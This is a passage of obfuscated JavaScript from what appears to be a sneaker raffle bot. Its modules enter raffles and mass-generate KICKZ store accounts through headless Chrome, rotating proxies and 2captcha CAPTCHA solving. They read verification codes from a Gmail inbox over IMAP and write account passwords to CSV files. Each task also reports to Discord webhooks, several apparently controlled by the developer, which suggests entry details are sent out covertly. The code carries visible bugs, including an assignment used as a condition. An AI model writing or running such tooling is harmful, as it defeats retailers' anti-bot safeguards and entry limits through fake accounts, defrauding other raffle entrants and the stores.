                    const _0x101db3 = { 'embeds': _0x58962b };
                    _0x5c2a2f(_0x38364c['name'] + '\x20Task\x20' + (_0x39acaf + 0x1) + '\x20/\x20' + _0x330098['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32);
                    try {
                        await _0x10409e(_0x330098, _0x39acaf);
                    } catch {
                        _0x4d6241 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x9cc776 = await _0xe75614(_0x330098[_0x39acaf], _0x38364c, 'dev', ![]), _0x4a2b83 = await _0xe75614(_0x330098[_0x39acaf], _0x38364c, 'pub', ![]);
                    const _0x99faf4 = {
                        'succesDEVMSG': { 'embeds': [_0x9cc776] },
                        'succesPUBMSG': { 'embeds': [_0x4a2b83] }
                    };
                    if (_0x343742['webhook'] != undefined && _0x343742['webhook'] != '')
                        try {
                            await _0x3c4b04(_0x343742['webhook'], _0x99faf4['succesDEVMSG']);
                        } catch {
                        }
                    await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x99faf4['succesDEVMSG']), await _0x4aaa24(0xc8);
                    try {
                        await _0x3c4b04(_0x510dd4, _0x99faf4['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x330098[_0x39acaf]['Email'] == '' || _0x330098[_0x39acaf]['Url'] == '' || _0x330098[_0x39acaf]['FirstName'] == '' || _0x330098[_0x39acaf]['LastName'] == '') {
                        console['log'](_0x15e32e() + '\x20[' + _0x34ba82[taskModule]['name'] + ']\x20Task\x20' + (_0x39acaf + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x343742['useRandomProxy'] = ![])
                        var _0x3b65d2 = _0x10dfd1[_0x39acaf]['split'](':');
                    else
                        var _0x44a4a0 = Math['round'](Math['random']() * (_0x10dfd1['length'] - 0x1)), _0x3b65d2 = _0x10dfd1[_0x44a4a0]['split'](':');
                    var _0x4a3a40;
                    try {
                        _0x4a3a40 = await _0x154b82['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3b65d2[0x0] + ':' + _0x3b65d2[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x4a3a40 = await _0x154b82['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3b65d2[0x0] + ':' + _0x3b65d2[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x5048a4 = await _0x4a3a40['newPage']();
                        await _0x5048a4['authenticate']({
                            'username': '' + _0x3b65d2[0x2],
                            'password': '' + _0x3b65d2[0x3]
                        }), console['log'](_0x15e32e() + '\x20[' + _0x38364c['name'] + ']\x20Task\x20' + (_0x39acaf + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5048a4['setRequestInterception'](!![]), _0x5048a4['on']('request', _0x393e47 => {
                            _0x393e47['resourceType']() === 'image' || _0x393e47['resourceType']() === 'font' || _0x393e47['resourceType']() === 'media' ? _0x393e47['abort']() : _0x393e47['continue']();
                        });
                        try {
                            await _0x5048a4['goto']('' + _0x330098[_0x39acaf]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x5048a4['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x15e32e() + '\x20[' + _0x38364c['name'] + ']\x20Task\x20' + (_0x39acaf + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5048a4['type']('#comp_firstname', '' + _0x330098[_0x39acaf]['FirstName']), await _0x5048a4['waitForSelector']('#comp_lastname'), await _0x5048a4['type']('#comp_lastname', '' + _0x330098[_0x39acaf]['LastName']), await _0x5048a4['waitForSelector']('#comp_email'), await _0x5048a4['type']('#comp_email', '' + _0x330098[_0x39acaf]['Email']), await _0x5048a4['waitForSelector']('#comp_paypalemail'), await _0x5048a4['type']('#comp_paypalemail', '' + _0x330098[_0x39acaf]['Email']), await _0x5048a4['waitForSelector']('#comp_mobile_end'), await _0x5048a4['type']('#comp_mobile_end', '' + _0x330098[_0x39acaf]['Phone']), await _0x5048a4['waitForSelector']('#comp_dob'), await _0x5048a4['type']('#comp_dob', '08/09/1992'), console['log'](_0x15e32e() + '\x20[' + _0x38364c['name'] + ']\x20Task\x20' + (_0x39acaf + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x330098[_0x39acaf]['Size'] == 'RANDOM') {
                            const _0x1c8179 = await _0x5048a4['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x45e340 => {
                                return _0x45e340['map'](_0x313eb8 => _0x313eb8['value']);
                            });
                            var _0x2f082e = Math['round'](Math['random']() * (_0x1c8179['length'] - 0x2));
                            await _0x5048a4['select']('#shoesize', _0x1c8179[_0x2f082e + 0x1]), await _0x4aaa24(0x3e8);
                        } else {
                            const _0x34194c = await _0x5048a4['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x52717b => {
                                return _0x52717b['map'](_0x83b141 => _0x83b141['innerText']);
                            }), _0x1ae359 = await _0x5048a4['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x38560a => {
                                return _0x38560a['map'](_0x322767 => _0x322767['value']);
                            });
                            var _0x2df0ed = _0x330098[_0x39acaf]['Size'];
                            for (var _0x1a90d1 = 0x1; _0x1a90d1 < _0x1ae359['length']; _0x1a90d1++) {
                                var _0x552626 = _0x34194c[_0x1a90d1]['split']('\x20')[0x0];
                                if (_0x552626 == _0x2df0ed) {
                                    await _0x5048a4['select']('#shoesize', _0x1ae359[_0x1a90d1]);
                                    break;
                                } else {
                                    if (_0x1a90d1 + 0x1 == _0x1ae359['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x5048a4['waitForSelector']('#comp_address1'), await _0x5048a4['type']('#comp_address1', _0x330098[_0x39acaf]['Address1'] + '\x20' + _0x330098[_0x39acaf]['HouseNumber']), await _0x5048a4['waitForSelector']('#comp_address2'), await _0x5048a4['type']('#comp_address2', '' + _0x330098[_0x39acaf]['Address2']), await _0x5048a4['waitForSelector']('#comp_address2'), await _0x5048a4['type']('#comp_address3', '' + _0x330098[_0x39acaf]['City']), await _0x5048a4['waitForSelector']('#comp_postcode'), await _0x5048a4['type']('#comp_postcode', '' + _0x330098[_0x39acaf]['Zip']), console['log'](_0x15e32e() + '\x20[' + _0x38364c['name'] + ']\x20Task\x20' + (_0x39acaf + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x4aaa24(0x4b0), await _0x5048a4['click']('label#emailhold'), await _0x4aaa24(0x5dc), await _0x5048a4['click']('#preauth_tandc_email\x20>\x20label'), await _0x4aaa24(0x5dc), await _0x5048a4['click']('#submit');
                        try {
                            await _0x5048a4['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x15e32e() + '\x20[' + _0x38364c['name'] + ']\x20Task\x20' + (_0x39acaf + 0x1) + '\x20:\x20' + _0x3f1ec6['blue']('Awaiting\x20Paypal\x20Payment')), _0x4a3a40['on']('targetcreated', async _0x90b983 => {
                            if (_0x90b983['type']() === 'page') {
                                const _0x48ec31 = await _0x90b983['page']();
                                async function _0x104c14() {
                                    try {
                                        await _0x5048a4['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x386ba2 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x328ca6() {
                                    try {
                                        await _0x5048a4['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x4a7f7d = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x328ca6(), _0x104c14(), await _0x4aaa24(0x493e0);
                            }
                        });
                        async function _0x2f7416() {
                            for (let _0x50a09d = 0x0; _0x50a09d < 0x12c; _0x50a09d++) {
                                if (_0x4a7f7d == !![]) {
                                    _0x4d6241 = 'no', _0x3265a5(_0x330098[_0x39acaf], _0x38364c), console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x38364c['name'] + ']\x20Task\x20' + (_0x39acaf + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x343742['webhook'] != undefined && _0x343742['webhook'] != '')
                                        try {
                                            await _0x3c4b04(_0x343742['webhook'], _0x99faf4['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x99faf4['succesDEVMSG']), await _0x4aaa24(0xc8);
                                    try {
                                        await _0x3c4b04(_0x510dd4, _0x99faf4['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x386ba2)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x4aaa24(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x4aaa24(0xbb8), await _0x5048a4['click']('.zoid-outlet'), await _0x4aaa24(0x7d0), await _0x2f7416();
                    } catch (_0x433c9c) {
                        console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x38364c['name'] + ']\x20Task\x20' + (_0x39acaf + 0x1) + '\x20:\x20' + _0x433c9c)), _0x23233d = '' + _0x433c9c;
                        var _0x533448 = await _0xe75614(_0x330098[_0x39acaf], _0x38364c, 'dev', !![], _0x23233d);
                        _0x99faf4['errorDEV'] = { 'embeds': [_0x533448] }, _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x99faf4['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x99faf4['errorDEV']);
                    } finally {
                        _0x4a3a40 && _0x4a3a40['close']();
                        if (_0x4d6241 == 'yes' && _0x4abeca != 0x5 && _0x23233d != 'Size\x20Not\x20Found') {
                            console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x38364c['name'] + ']\x20Task\x20' + (_0x39acaf + 0x1) + '\x20:\x20Retrying\x20(' + _0x4abeca + '\x20/\x205)')), _0x39acaf = _0x39acaf - 0x1, _0x4abeca = _0x4abeca + 0x1;
                            continue;
                        }
                        _0x4d6241 == 'yes' && _0x4abeca >= 0x5 && (_0x5d0cd0(afew[_0x39acaf], _0x38364c), _0x4d6241 = 'no', _0x4abeca = 0x0), console['log']('Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x12676d, _0xba720d, _0x2604d9) {
                    _0x154b82['use'](_0x4918ac()), _0x154b82['use'](_0x3cd441({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x343742['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xcb08c1 = 0x0; _0xcb08c1 < _0xba720d['length']; _0xcb08c1++) {
                        const _0x32ab2a = 'https://www.kickz.com/login';
                        if (_0x226151 != 'yes')
                            var _0x226151 = '', _0x27a141 = 0x0;
                        _0x5c2a2f(_0x12676d['name'] + '\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20/\x20' + _0xba720d['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32);
                        try {
                            await _0x10409e(_0xba720d, _0xcb08c1);
                        } catch {
                            _0x226151 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x5bf84a = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1b66d2
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x343742['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3c97e2
                                }
                            ]
                        }];
                        const _0x362652 = { 'embeds': _0x5bf84a };
                        var _0x307be3 = await _0xe75614(_0xba720d[_0xcb08c1], _0x12676d, 'acc', ![]);
                        const _0x33fa2d = { 'succesDEVMSG': { 'embeds': [_0x307be3] } };
                        if (_0xba720d[_0xcb08c1]['Email'] == '' || _0xba720d[_0xcb08c1]['FirstName'] == '' || _0xba720d[_0xcb08c1]['LastName'] == '') {
                            console['log'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0xba720d[_0xcb08c1]['Password'] == '' && (_0xba720d[_0xcb08c1]['Password'] = 'JRaffles23!');
                        if (_0x343742['useRandomProxy'] = ![])
                            var _0x349c44 = _0x2604d9[_0xcb08c1]['split'](':');
                        else
                            var _0x30a115 = Math['round'](Math['random']() * (_0x2604d9['length'] - 0x1)), _0x349c44 = _0x2604d9[_0x30a115]['split'](':');
                        var _0x1374e1;
                        try {
                            _0x1374e1 = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x349c44[0x0] + ':' + _0x349c44[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1374e1 = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x349c44[0x0] + ':' + _0x349c44[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1e0ca7 = await _0x1374e1['newPage']();
                            await _0x1e0ca7['authenticate']({
                                'username': '' + _0x349c44[0x2],
                                'password': '' + _0x349c44[0x3]
                            }), console['log'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1e0ca7['setRequestInterception'](!![]), _0x1e0ca7['on']('request', _0x36dfa7 => {
                                _0x36dfa7['resourceType']() === 'image' || _0x36dfa7['resourceType']() === 'font' || _0x36dfa7['resourceType']() === 'media' ? _0x36dfa7['abort']() : _0x36dfa7['continue']();
                            }), await _0x1e0ca7['goto'](_0x32ab2a), await _0x4aaa24(0xbb8), console['log'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x1e0ca7['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1e0ca7['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1e0ca7['waitForSelector']('#button-register'), await _0x4aaa24(0x7d0), await _0x1e0ca7['evaluate'](() => {
                                const _0x438b0b = document['querySelector']('#button-register');
                                _0x438b0b['click']();
                            }), console['log'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x4aaa24(0x1388), await _0x1e0ca7['waitForSelector']('#customer_salutation'), await _0x1e0ca7['select']('#customer_salutation', 'mr'), await _0x4aaa24(0x7d0), await _0x1e0ca7['waitForSelector']('#customer_firstname'), await _0x1e0ca7['type']('#customer_firstname', '' + _0xba720d[_0xcb08c1]['FirstName']), await _0x4aaa24(0x352), await _0x1e0ca7['waitForSelector']('#customer_lastname'), await _0x1e0ca7['type']('#customer_lastname', '' + _0xba720d[_0xcb08c1]['LastName']), await _0x4aaa24(0x352), await _0x1e0ca7['type']('#email-input', '' + _0xba720d[_0xcb08c1]['Email']), await _0x4aaa24(0x352), await _0x1e0ca7['type']('#email-confirm-input', '' + _0xba720d[_0xcb08c1]['Email']), await _0x4aaa24(0x352), await _0x1e0ca7['type']('#register-password', '' + _0xba720d[_0xcb08c1]['Password']), await _0x4aaa24(0x352), await _0x1e0ca7['type']('#password-confirm', '' + _0xba720d[_0xcb08c1]['Password']), await _0x4aaa24(0x352), console['log'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x1e0ca7['click']('#consent'), await _0x4aaa24(0x1f4);
                            const _0x424409 = await _0x1e0ca7['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x424409) {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x1e0ca7['click']('#buttonRegister');
                            try {
                                await _0x1e0ca7['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0xba720d[_0xcb08c1]['Email']), await _0x4aaa24(0x4b0);
                            async function _0x1a0a24() {
                                var _0x1db7b9, _0x4eddc1 = ![];
                                for (var _0x12d552 = 0x0; _0x12d552 < 0x18; _0x12d552++) {
                                    async function _0x5a8b89() {
                                        var _0x3f7d09 = new _0x5a0913({
                                            'user': _0x343742['masterMail'],
                                            'password': _0x343742['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x3acfea(_0x3dc62c) {
                                            _0x3f7d09['openBox']('INBOX', ![], _0x3dc62c);
                                        }
                                        _0x3f7d09['once']('ready', function () {
                                            console['log'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x3acfea(function (_0x1c08bc, _0x5e969f) {
                                                console['log'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x1c08bc)
                                                    throw _0x1c08bc;
                                                _0x3f7d09['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x3e4d88, _0x176178) {
                                                    if (!_0x176178 || !_0x176178['length'])
                                                        console['log'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x3f7d09['end']();
                                                    else {
                                                        var _0x4ae3c6 = _0x3f7d09['seq']['fetch'](_0x176178, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x4ae3c6['on']('message', function (_0xb9e705, _0x115765) {
                                                            var _0x18a325 = '(#' + _0x115765 + ')\x20';
                                                            _0xb9e705['on']('body', function (_0x1cc739, _0x5e56ce) {
                                                                _0x57117f(_0x1cc739, (_0x15a6dd, _0xfef328) => {
                                                                    if (_0xfef328['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x4b5f6b = _0xfef328['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x1389c9 = _0x4b5f6b[0x1]['split']('<')[0x0];
                                                                        _0x1db7b9 = _0x1389c9;
                                                                    }
                                                                });
                                                            }), _0xb9e705['once']('end', function () {
                                                            });
                                                        }), _0x4ae3c6['once']('error', function (_0x520618) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x4ae3c6['once']('end', function () {
                                                            _0x3f7d09['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x3f7d09['once']('error', function (_0x512bc2) {
                                            console['log'](_0x3f1ec6['red'](_0x512bc2['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x4eddc1 = !![];
                                        }), _0x3f7d09['once']('end', async function () {
                                        }), _0x3f7d09['connect']();
                                    }
                                    _0x5a8b89(), await _0x4aaa24(0x1388);
                                    if (_0x1db7b9)
                                        return _0x1db7b9;
                                    if (_0x4eddc1)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x12d552 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x1a0a24(), _0x4aaa24(0x320), console['log'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20:\x20Verifying..'), await _0x1e0ca7['type']('#verificationCode', code), await _0x4aaa24(0x1f4), await _0x1e0ca7['click']('#buttonVerify'), await _0x4aaa24(0x190), await _0x1e0ca7['click']('#buttonVerify'), await _0x4aaa24(0x3e8);
                            try {
                                await _0x1e0ca7['waitForSelector']('div.b-user_greeting'), _0x226151 = 'no', console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20:\x20Account\x20' + _0xba720d[_0xcb08c1]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x343ecd['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0xba720d[_0xcb08c1]['Email'] + ',' + _0xba720d[_0xcb08c1]['Password'] + ','), console['log'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20:\x20Account\x20' + _0xba720d[_0xcb08c1]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x33fa2d['succesDEVMSG']);
                                } catch {
                                }
                                await _0x3c4b04(_0x435bee, _0x33fa2d['succesDEVMSG']);
                            } catch {
                                _0x226151 = 'no', console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x9a2f13) {
                            console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20:\x20' + _0x9a2f13)), _0x5bf84a[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x5bf84a[0x0]['description'] = '' + _0x9a2f13, await _0x3c4b04(_0x1dfefb, _0x362652), _0x226151 = 'yes';
                        } finally {
                            _0x1374e1 && _0x1374e1['close']();
                            if (_0x226151 == 'yes' && _0x27a141 != 0x5) {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x12676d['name'] + ']\x20Task\x20' + (_0xcb08c1 + 0x1) + '\x20:\x20Retrying\x20(' + _0x27a141 + '\x20/\x205)')), _0xcb08c1 = _0xcb08c1 - 0x1, _0x27a141 = _0x27a141 + 0x1;
                                continue;
                            }
                            _0x226151 == 'yes' && _0x27a141 >= 0x5 && (_0x5d0cd0(_0xba720d[_0xcb08c1], _0x12676d), _0x226151 = 'no', _0x27a141 = 0x0), console['log']('Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x1aec55, _0xc9ce23, _0x594859) {
                    _0x154b82['use'](_0x4918ac()), _0x154b82['use'](_0x3cd441({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x343742['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x565783 = 0x0; _0x565783 < _0xc9ce23['length']; _0x565783++) {
                        var _0x23b961;
                        if (_0x14ac5b != 'yes')
                            var _0x14ac5b = '', _0x457d57 = 0x0;
                        _0x5c2a2f(_0x1aec55['name'] + '\x20Task\x20' + (_0x565783 + 0x1) + '\x20/\x20' + _0xc9ce23['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32);
                        var _0x402637 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1b66d2
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0xc9ce23[_0x565783]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0xc9ce23[_0x565783]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x343742['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3c97e2
                                }
                            ]
                        }], _0x37ff38 = await _0xe75614(_0xc9ce23[_0x565783], _0x1aec55, 'dev', ![]), _0x3a79e0 = await _0xe75614(_0xc9ce23[_0x565783], _0x1aec55, 'pub', ![]);
                        const _0x4daf66 = {
                            'succesDEVMSG': { 'embeds': [_0x37ff38] },
                            'succesPUBMSG': { 'embeds': [_0x3a79e0] }
                        };
                        try {
                            await _0x10409e(_0xc9ce23, _0x565783);
                        } catch {
                            _0x14ac5b = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0xc9ce23[_0x565783]['Email'] == '' || _0xc9ce23[_0x565783]['Password'] == '' || _0xc9ce23[_0x565783]['FirstName'] == '' || _0xc9ce23[_0x565783]['LastName'] == '') {
                            console['log'](_0x15e32e() + '\x20[' + _0x1aec55['name'] + ']\x20Task\x20' + (_0x565783 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x343742['useRandomProxy'] = ![])
                            var _0x1e819a = _0x594859[_0x565783]['split'](':');
                        else
                            var _0x4eed1d = Math['round'](Math['random']() * (_0x594859['length'] - 0x1)), _0x1e819a = _0x594859[_0x4eed1d]['split'](':');
                        var _0xf98e5a;
                        try {
                            _0xf98e5a = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x1e819a[0x0] + ':' + _0x1e819a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xf98e5a = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x1e819a[0x0] + ':' + _0x1e819a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3113b3 = await _0xf98e5a['newPage']();
                            await _0x3113b3['authenticate']({
                                'username': '' + _0x1e819a[0x2],
                                'password': '' + _0x1e819a[0x3]
                            }), console['log'](_0x15e32e() + '\x20[' + _0x1aec55['name'] + ']\x20Task\x20' + (_0x565783 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3113b3['setRequestInterception'](!![]), _0x3113b3['on']('request', _0xf6fe16 => {
                                _0xf6fe16['resourceType']() === 'image' || _0xf6fe16['resourceType']() === 'font' || _0xf6fe16['resourceType']() === 'media' ? _0xf6fe16['abort']() : _0xf6fe16['continue']();
                            }), await _0x3113b3['goto']('' + _0xc9ce23[_0x565783]['Url'], { 'waitUntil': 'networkidle2' }), await _0x4aaa24(0x12c), await _0x3113b3['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x3113b3['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4aaa24(0x7d0);
                            try {
                                await _0x3113b3['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x3113b3['click']('a[title=\x22sign\x20in\x22]');
                            }
